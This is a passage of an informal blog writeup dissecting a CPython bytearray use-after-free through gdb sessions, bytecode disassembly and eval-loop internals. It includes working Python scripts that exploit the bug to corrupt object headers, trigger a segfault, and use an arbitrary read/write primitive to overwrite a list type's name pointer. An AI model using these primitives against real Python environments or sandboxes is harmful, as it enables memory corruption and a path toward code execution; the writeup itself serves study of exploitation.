0x7ffff7bf9010:	0x97	0x00	0x74	0x00	0x00	0x00	0x00	0x00
0x7ffff7bf9018:	0x00	0x00	0x00	0x00	0x00	0x00	0xa0	0x01
0x7ffff7bf9020:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x7ffff7bf9028:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x7ffff7bf9030:	0x00	0x00	0x00	0x00	0xa6	0x00	0x00	0x00
0x7ffff7bf9038:	0xab	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x7ffff7bf9040:	0x00	0x00	0x01	0x00	0x74	0x05	0x00	0x00
0x7ffff7bf9048:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
```

personally i find this endlessly interesting! and of course, we can use python's built-in `dis` module to give us a high-level disassembly of this bytecode:

```py
[-$ python uaf-dis.py
          RESUME                   0
          LOAD_GLOBAL              0
          LOAD_ATTR                3
          CALL                     0
          POP_TOP
          LOAD_GLOBAL              5
          CALL                     0
          STORE_GLOBAL             3
          LOAD_GLOBAL              0
          LOAD_ATTR                9
          LOAD_CONST               1
          BUILD_LIST               1
          LOAD_CONST               2
          BINARY_OP                5 (*)
          CALL                     1
          POP_TOP
          RETURN_CONST             3
```

as a brief aside about `dis` (in an article already fucking full of 'brief' asides, jesus christ, i need to learn how to make writeups that aren't utterly fucking schizophrenic):

python code objects have a list of constants `co_consts / co_names / co_varnames` etc and the actual python bytecode itself, `co_code`. there is basically no way to interface w/ those constants from _the bytecode level_ itself, there's no opcode or functionality that lets you do this. basically, if a function wants to access a global or a builtin, the `code` object will save it as a constant and then a `LOAD_CONST` opcode will load it into the python bytecode evalframe stack.

but anyways, my point is that while `dis` can support raw bytecode, it does a lot better with the actual `code` object as it can show you how the `LOAD_CONST` ops resolve. here's what that looks like!

```py
[-$ python uaf.py
  2           RESUME                   0

  4           LOAD_GLOBAL              0 (uaf)
              LOAD_ATTR                3 (clear + NULL|self)
              CALL                     0
              POP_TOP

  5           LOAD_GLOBAL              5 (bytearray + NULL)
              CALL                     0
              STORE_GLOBAL             3 (memory)

  6           LOAD_GLOBAL              0 (uaf)
              LOAD_ATTR                9 (extend + NULL|self)
              LOAD_CONST               1 (0)
              BUILD_LIST               1
              LOAD_CONST               2 (56)
              BINARY_OP                5 (*)
              CALL                     1
              POP_TOP

  7           RETURN_CONST             3 (1)
```

so yeah we can see a good rundown of how our `__index__` function is interpreted on the bytecode level. yay!

### and another diversion

so i was going to promise myself that i wasn't going to look into bytecode interpreting but there's just no way i can satiate myself + make a decent writeup without going into the internals of how it works. i want to _see_ where, for example, `uaf.clear()` gets called. so let's get into the internals. our `vectorcall_method()` call strings together a whole entire chain of funcs until we get to what we want, specifically:

```c
slot_nb_index() -> 
  _PyFunction_vectorcall() -> 
  _PyEval_vector() -> 
  _PyEval_EvalFrameDefault()
```

and `EvalFrameDefault()` is the function that actually, fucking finally, INTERPRETS OUR BYTECODE. WOOHOO!!!!

this is a fucking _HUGE_ function, understandably so, as it handles all of the opcodes. viewing `info locals` we can actually see the bytecode definitions - they're defined as jumps / addresses into specific areas of the functions in this `opcode_targets` local:

```c
opcode_targets = {
  [0x0] = 0x55555564366b <compiler_visit_expr1[cold]>,
  [0x1] = 0x5555557b1473 <_PyEval_EvalFrameDefault+10899>,
  [0x2] = 0x5555557b2a18 <_PyEval_EvalFrameDefault+16440>,
  [0x3] = 0x5555557b3306 <_PyEval_EvalFrameDefault+18726>,
  [0x4] = 0x5555557b508b <_PyEval_EvalFrameDefault+26283>,
  [0x5] = 0x5555557b5990 <_PyEval_EvalFrameDefault+28592>,
  [0x6] = 0x5555557b4737 <_PyEval_EvalFrameDefault+23895>,
  [0x7] = 0x5555557b47bf <_PyEval_EvalFrameDefault+24031>,
  ...
```

(most entries redacted for brevity)

the heart of this func is this `DISPATCH()` macro:

```c
#define DISPATCH() \
    goto *opcode_targets[opcode]
```

hopefully at this point in the fucking writeup this is selfexplanatory. here's me having paused execution at a `DISPATCH()` - let's see what happens on the asm level:

```c
 <_PyEval_EvalFrameDefault+0xe5>   movzx  edi, ah
 <_PyEval_EvalFrameDefault+0xe8>   or     al, BYTE PTR [rsp + 0xa0]
 <_PyEval_EvalFrameDefault+0xef>   mov    r9d, edi
 <_PyEval_EvalFrameDefault+0xf2>   mov    rdi, QWORD PTR [rsp]
 <_PyEval_EvalFrameDefault+0xf6>   movzx  edx, al
 <_PyEval_EvalFrameDefault+0xf9>   jmp    QWORD PTR [rdi + rdx * 8]
```

this `jmp` is supposedly where we will get `DISPATCH()`'d to, meaning one of our opcodes is stored in our registers. ideally i would love to just `info locals` and print the opcode but:

```c
opcode = <optimized out>
oparg = <optimized out>
eval_breaker = <optimized out>
cframe = {
  use_tracing = 0x0,
  current_frame = 0x7ffff7fb2088,
  previous = 0x7fffffffda40
}
```

shag, lets just eyepower the registers from here. essentially:
1. `or al, BYTE PTR [rsp + 0xa0]`: the current opcode is stored at offset `0xa0` from the stack, so we load it into the lower bits of `rax`, or just `al`.
2. `mov rdi, QWORD PTR [rsp]`: the very top of `rsp` contains the opcode jump table. we load that ptr into `rdi`.
3. `movzx edx, al`: 'essentially' (simplification) just a `mov rdx, rax`
4. `jmp QWORD PTR [rdi + rdx * 8]` : our actual `jmp`, where the execution flow now changes. given that `rdi` now contains the ptr to the opcode jump, we just take the `rdx`'th offset and jump to wherever address that leads us.

right now, `rax` is 0x97. where will that lead us?

```c
gef> i r
rax:  0x97
gef> p *($rdi + $rax*8)
$123 = 0x557b2967 # <- manually calculating the target instr addr
```


```c
    0x5555557aeacf 4189f9                <_PyEval_EvalFrameDefault+0xef>   mov    r9d, edi
    0x5555557aead2 488b3c24              <_PyEval_EvalFrameDefault+0xf2>   mov    rdi, QWORD PTR [rsp]
    0x5555557aead6 0fb6d0                <_PyEval_EvalFrameDefault+0xf6>   movzx  edx, al
 -> 0x5555557aead9 ff24d7                <_PyEval_EvalFrameDefault+0xf9>   jmp    QWORD PTR [rdi + rdx * 8] <_PyEval_EvalFrameDefault+0x3f87>

   -> 0x5555557b2967 498b7c2420            <_PyEval_EvalFrameDefault+0x3f87>   mov    rdi, QWORD PTR [r12 + 0x20] # WAHEY THERE WE GO
      0x5555557b296c 4d89742438            <_PyEval_EvalFrameDefault+0x3f8c>   mov    QWORD PTR [r12 + 0x38], r14
      0x5555557b2971 498d6e02              <_PyEval_EvalFrameDefault+0x3f91>   lea    rbp, [r14 + 0x2]
      0x5555557b2975 0fb74734              <_PyEval_EvalFrameDefault+0x3f95>   movzx  eax, WORD PTR [rdi + 0x34]
      0x5555557b2979 6685c0                <_PyEval_EvalFrameDefault+0x3f99>   test   ax, ax
      0x5555557b297c 7410                  <_PyEval_EvalFrameDefault+0x3f9c>   je     0x5555557b298e <_PyEval_EvalFrameDefault+0x3fae>

    0x5555557aeadc 8b5720                <_PyEval_EvalFrameDefault+0xfc>   mov    edx, DWORD PTR [rdi + 0x20]
    0x5555557aeadf 8d42ff                <_PyEval_EvalFrameDefault+0xff>   lea    eax, [rdx - 0x1]
    0x5555557aeae2 894720                <_PyEval_EvalFrameDefault+0x102>   mov    DWORD PTR [rdi + 0x20], eax
    0x5555557aeae5 85d2                  <_PyEval_EvalFrameDefault+0x105>   test   edx, edx
    0x5555557aeae7 0f8ebe050000          <_PyEval_EvalFrameDefault+0x107>   jle    0x5555557af0ab <_PyEval_EvalFrameDefault+0x6cb>
```

sure enough, we jump to that instr, and looking at the actual debug symbols and cross referencing w/ `dis.opmap`:

```c
   1766           TARGET(NOP) {
   1767               DISPATCH();
   1768           }
   1769   
 ->1770           TARGET(RESUME) { # <- WE ARE HERE
   1771               _PyCode_Warmup(frame->f_code);
   1772               JUMP_TO_INSTRUCTION(RESUME_QUICK);
   1773           }
   1774   
   1775           TARGET(RESUME_QUICK) {
```


```py
>>> for i in dis.opmap: print(i, dis.opmap[i])
...
SET_ADD 146
MAP_ADD 147
LOAD_CLASSDEREF 148
COPY_FREE_VARS 149
RESUME 151 <- # WE ARE HERE
MATCH_CLASS 152
FORMAT_VALUE 155
BUILD_CONST_KEY_MAP 156
BUILD_STRING 157
```

how neat!

this `RESUME` op is kind of a nothingburger though, it just initializes the eval frame. what if we actually do something a bit more interesting? stepping forward a bit we find ourselves in a `LOAD_GLOBAL` call.

```c
 ->2992           TARGET(LOAD_GLOBAL) {
   2993               PREDICTED(LOAD_GLOBAL);
   2994               int push_null = oparg & 1;
   2995               PEEK(0) = NULL;
   2996               PyObject *name = GETITEM(names, oparg>>1);
   2997               PyObject *v;
```

recalling our `dis.dis()` output earlier, we should expect this to load our `uaf` global somewhere! going through the actual source code at this `LOAD_GLOBAL` branch we get a bunch of calls to stuff like `PyDict_CheckExact`, `PyObject_GetItem` - which makes sense. the `LOAD_GLOBAL` func is simply trying to find the 'global', after all. it's good to remember that our 'global' (our `uaf` variable) is just a pointer to a bytearray stored in `co_consts` somewhere. just for completeness sake, i'll step through the whole `LOAD_GLOBAL` shebang. 

```c
PyObject *v;
if (pydict_checkexact(globals())
  && pydict_checkexact(builtins()))
{
  v = _pydict_loadglobal((pydictobject *)globals(),
                          (pydictobject *)builtins(),
                          name);
  if (v == null) {
      if (!_pyerr_occurred(tstate)) {
          /* _pydict_loadglobal() returns null without raising
            * an exception if the key doesn't exist */
          format_exc_check_arg(tstate, pyexc_nameerror,
                                name_error_msg, name);
      }
      goto error;
  }
  py_incref(v);
}
```

this should also be self explanatory. we're essentially just doing `globals()['uaf']`, saving the pointer to `v`, and increasing `v`'s `ob_refcnt` attr. we can view `v`:

```c
gef> p *(PyByteArrayObject*)v
$126 = {
  ob_base = {
    ob_base = {
      ob_refcnt = 0x3,
      ob_type = 0x5555559bb760 <PyByteArray_Type>
    },
    ob_size = 0x38
  },
  ob_alloc = 0x39,
  ob_bytes = 0x7ffff76da3b0 "",
  ob_start = 0x7ffff76da3b0 "",
  ob_exports = 0x0
}
```

remember that this is the array we're going to free by calling `uaf.clear()`!

moving forward, let's look at the `LOAD_METHOD` call. we just keep `next`ing through calls, so on and so forth, until we land in the middle of the op:

```c
   4480           TARGET(LOAD_METHOD) {
   4481               PREDICTED(LOAD_METHOD);
   4482               /* Designed to work in tandem with PRECALL. */
 ->4483               PyObject *name = GETITEM(names, oparg);
   4484               PyObject *obj = TOP();
   4485               PyObject *meth = NULL;
```

we can see that after we `LOAD_GLOBAL`, our `uaf` ptr is now present on the top of our stack. then, we just take it from the top such that we can grab the specific method.

however, we can't actually print it due to compiler optimizations.

```c
gef> p obj
$20 = <optimized out>
```

reading the disass, we can see that this is because these pointers get _directly loaded_ into registers - the program doesn't bother pushing them onto the stack.

```c
    0x5555557b2129 48c784248000000000..  <_PyEval_EvalFrameDefault+0x3749>   mov    QWORD PTR [rsp+0x80], 0x0
    0x5555557b2135 4c895c2420            <_PyEval_EvalFrameDefault+0x3755>   mov    QWORD PTR [rsp+0x20], r11
    0x5555557b213a 4a8b74f818            <_PyEval_EvalFrameDefault+0x375a>   mov    rsi, QWORD PTR [rax+r15*8+0x18]
 -> 0x5555557b213f e8dcabf4ff            <_PyEval_EvalFrameDefault+0x375f>   call   0x5555556fcd20 <_PyObject_GetMethod>
```

regardless, we can still see the output of this `_PyObject_GetMethod` call, as that isn't optimized out:

```c
gef> p *(PyMethodObject*)meth
$27 = {
  ob_base = {
    ob_refcnt = 0x2,
    ob_type = 0x5555559bf880 <PyMethodDescr_Type>
  },
  im_func = 0x5555559bb760 <PyByteArray_Type>,
  im_self = 0x555555acab30 <_PyRuntime+34384>,
  im_weakreflist = 0x0,
  vectorcall = 0x5555559bb9e0 <bytearray_methods+224>
}
```

knowing that this is our `uaf.clear` func, we can check and verify that the 7th (224 / 32) entry in this `bytearray_methods` table corresponds to the correct func, and indeed it does.

```c
gef> p bytearray_methods[7]
$32 = {
  ml_name = 0x5555558b1e6c "clear",
  ml_meth = 0x555555687e20 <bytearray_clear>,
  ml_flags = 0x4,
  ml_doc = 0x5555558d4400 <bytearray_clear.doc__> "clear($self, /)\n--\n\nRemove all items from the b
```

then, `bytearray_clear` is actually just a builtin C func that resizes our array!

```c
static PyObject *
bytearray_clear_impl(PyByteArrayObject *self)
/*[clinic end generated code: output=85c2fe6aede0956c input=ed6edae9de447ac4]*/
{
    if (PyByteArray_Resize((PyObject *)self, 0) < 0)
        return NULL;
    Py_RETURN_NONE;
}
```

to jog your memory - this essentialy 'frees' the `uaf` buffer, such that when we malloc a new `memory` buf, it will occupy the same memory address that `uaf`'s struct metadata occupies. then, with our `__index__` trick, we can modify the memory struct's metadata.

.. whew! i could step through all the bytecodes one by one, but honestly i think you get it at this point. i've covered how `__index__` is accessed on a bytecode level and then interpreted by python's `EvalFrame` functions, and then i've shown how the `uaf` actually works, and how the `memory` field gets corrupted to have a nullptr w/ a really large `ob_size`.

### ob_refcnt nonsense

of course, we intentionally only write to `ob_size` because this allows our exploit to occur, but by picking and choosing offsets, we can overwrite other bits of metadata.

```c
gef> p *(PyByteArrayObject*)0x7ffff76da470
$7 = {
  ob_base = {
    ob_base = {
      ob_refcnt = 0x1,
      ob_type = 0x5555559bb760 <PyByteArray_Type>
    },
    ob_size = 0x38
  },
  ob_alloc = 0x39,
  ob_bytes = 0x7ffff76da4b0 "",
  ob_start = 0x7ffff76da4b0 "",
  ob_exports = 0x0
}
```

do note, however, that we just _are_ limited to a char size write due to how `buf[i]` gets assigned:

```c
buf[i] = (char)ival

```
we certainly could overwrite, say, `ob_refcnt`..? let's modify the script to do that.

```py
class B:
    def __index__(self):
        global memory
        uaf.clear()
        memory = bytearray()
        uaf.extend([0] * 56)
        return 0

uaf = bytearray(56)
uaf[0] = B()
print(hex(id(memory)))
input('...')
```

there's two changes: we modify `__index__` to return `0`, and we set our index into `uaf` to be the offset of `ob_refcnt` within the struct (in this case, `ob_refcnt` is actually the very first item, so this makes our job easy). just to reiterate what this does: the reason python keeps such close tabs on how many objects 'reference' another object is for garbage collection: if there are no existing references to a certain object, we can just treat it as if it were freed memory and allocate something in its space. so, by purposefully nulling out `ob_refcnt`, we are essentially marking this struct's area of memory as freed, meaning python will try to put other objects in the same area!

if we run this, and inspect the struct:

```c
gef> p *(PyByteArrayObject*)0x7ffff76da070
$8 = {
  ob_base = {
    ob_base = {
      ob_refcnt = 0x7ffff76da0b0,
      ob_type = 0x5555559d5860 <PyUnicode_Type>
    },
    ob_size = 0x2
  },
  ob_alloc = 0xffffffffffffffff,
  ob_bytes = 0xe4 <error: Cannot access memory at address 0xe4>,
  ob_start = 0x0,
  ob_exports = 0x3766666666003431
}
```

hopefully i have been a good enough teacher such that you can obviously see what's wrong here - our `PyByteArrayObject` struct has now been freed, and something has been malloc'd in its place - a `PyUnicodeObject`...? let's cast it:

```c
gef> p *(PyUnicodeObject*)0x7ffff76da070
$9 = {
  _base = {
    _base = {
      ob_base = {
        ob_refcnt = 0x7ffff76da0b0,
        ob_type = 0x5555559d5860 <PyUnicode_Type>
      },
      length = 0x2,
      hash = 0xffffffffffffffff,
      state = {
        interned = 0x0,
        kind = 0x1,
        compact = 0x1,
        ascii = 0x1,
        ready = 0x1
      },
      wstr = 0x0
    },
    utf8_length = 0x3766666666003431,
    utf8 = 0x303730616436 <error: Cannot access memory at address 0x303730616436>,
    wstr_length = 0x7ffff76da0f0
  },
  data = {
    any = 0x5555559d5860 <PyUnicode_Type>,
    latin1 = 0x5555559d5860 <PyUnicode_Type> "L",
    ucs2 = 0x5555559d5860 <PyUnicode_Type>,
    ucs4 = 0x5555559d5860 <PyUnicode_Type>
  }
}
```

the `utf_8` value is actually kind of interesting here because it does look like an actual string:

```c
gef> x/2s &(*(PyUnicodeObject*)0x7ffff76da070)->_base->utf8
0x7ffff76da0a8:	"6da070"
```

that's.. that's the string we printed out, when we called `print(hex(id(memory)))`! it's incomplete, but it's there! how fucking cool is that huh???

there is a lot of tinkering you can do with this, and it's not difficult to get a segfault. but you can see that this is a _lot_ harder to control and exploit directly, which is why the exploit author opted to modify `ob_size` instead. here's a segfault i found:

```py
class B:
    def __index__(self):
        global memory
        uaf.clear()
        memory = bytearray()
        uaf.extend([0] * 56)
        return 0

uaf = bytearray(56)
uaf[0] = B()
print(len(memory))
print(type(memory), memory)
input('...')
```

whew!

### reflection

after going through all that i think we owe it to the exploit authors and the maple bacon writers and the developers of gdb some words of respect, so here are mine:

holy shit what the fuck how does anyone figure this out this is so many moving parts and it is so unintuitive to me that you could even do this like how do you see this fucking vuln at all how do you see this and think ah yeah that caches a pointer and we can do a UAF with it because you have to fucking. WRITE YOUR OWN `__index__` function to even get to this point man what the fuck i think pwn researchers are actually insane like i can understand and follow along but the idea of me ever figuring this out independently? what the fuck dude you could give me a million years and i would never fucking find this man. what the fucking hell. actually like what the fuck???? i stand on the shoulders of giants

how is gdb real software im so serious what the hell this is some of the best shit ive ever used you mean to tell me i can just print my structs and its just . its just fucking THERE MAN what the HELL!!! WHAT THE HELL!!! HHHHHHHHHHHUHHHH I LOVE GDB SO MUCH RARARAHRAKLJDSALKDJ

### ok but you didn't actually like pwn anything what did we do all this for

.. that will be for the next blogpost! ;) to tide you over while i figure this out, here is a POC for what you can do with the arbwrite (it's not _quite_ code exec, but it's something i guess)

```py
import struct

class B:
    def __index__(self):
        global memory
        uaf.clear()
        memory = bytearray()
        uaf.extend([0] * 56)
        return 1

uaf = bytearray(56)
uaf[23] = B()

vuln_list = [i for i in range(10000)]
addr = id(vuln_list)
print(f'{hex(addr) = }')
PyList_format = 'q' * 8
list_vars = struct.unpack(PyList_format, memory[addr:addr + struct.calcsize(PyList_format)])
pylist_addr = list_vars[1]
target_str = b'hey so this is supposed to be class <list> or whatever but it is this. isnt that crazy\0'
target_addr = (id(target_str) + 0x20).to_bytes(8, byteorder='little') # padding
offset = 0x08 * 3

for i in range(0x08):
    memory[pylist_addr + offset + i] = target_addr[i]

print(type(list()))
```

tune in for next time, when i finally figure out how to get a libc leak !
